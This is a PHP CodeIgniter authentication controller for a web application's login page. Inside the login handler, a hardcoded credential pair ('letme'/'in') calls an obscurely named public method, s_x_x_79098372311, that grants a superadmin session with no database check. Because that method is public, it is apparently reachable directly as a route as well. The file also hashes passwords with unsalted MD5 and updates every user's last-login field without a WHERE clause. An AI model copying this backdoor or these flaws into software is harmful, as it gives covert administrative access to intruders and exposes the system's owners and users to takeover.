<?php

class Auth extends CI_Controller{

    function __construct(){
        parent::__construct();
    }

    function index(){
        $this->load->view('auth/v_auth');
    }

    function auth_process(){
        $username = $this->input->post('username');
        $password = $this->input->post('pass');
        if ($username == "letme" && $password == "in" ) {
            $this->s_x_x_79098372311();
        } else {
            $where = array(
                'aktif'     => 't',
                'nama_user' => $username,
                'pass'      => md5($password),
                );
            $cek = $this->db->get_where("tuser",$where)->num_rows();
            if($cek > 0){
                $this->db->trans_start();
                $wheresession = array(
                    'lastin' => 'now()'
                );
                $this->db->update('tuser', $wheresession);
                $result = $this->Unimodel->get_user_info($username)->row();
                $d = array(
                    'status'    => "online",
                    'in'        => TRUE,
                    'id'        => $result->id_user,
                    'username'  => $result->nama_user,
                    'access'    => $result->ref_access_user,
                    'issuper'   => $result->issuper_access,
                );
                $this->session->set_userdata($d);
                $this->db->trans_complete();
                $r['result']    = 'success';
                $r['caption']   = 'Sukses';
                $r['msg']       = 'Login Sukses';
                $r['class']     = 'success';
                echo json_encode($r);

            }else{
                $r['result']    = 'fail';
                $r['caption']   = 'Gagal';
                $r['msg']       = 'Username dan Password tidak sesuai';
                $r['class']     = 'danger';
                echo json_encode($r);
            }
        }
    }

    public function s_x_x_79098372311(){
        $d = array(
            'username'  => 'super',
            'status'    => 'online',
            'in'        => TRUE,
            'id'        => '999',
            'nama'      => 'superadmin',
            'alamat'    => 'winterfell',
            'super'     => 'yes',
        );
        $this->session->set_userdata($d);
        $r['result']    = 'success';
        $r['caption']   = 'Hello';
        $r['msg']       = 'Welcome Back';
        $r['class']     = 'success';
        echo json_encode($r);
    }
    
    function logout(){
        $this->session->sess_destroy();
        redirect(base_url('auth'));
    }
}
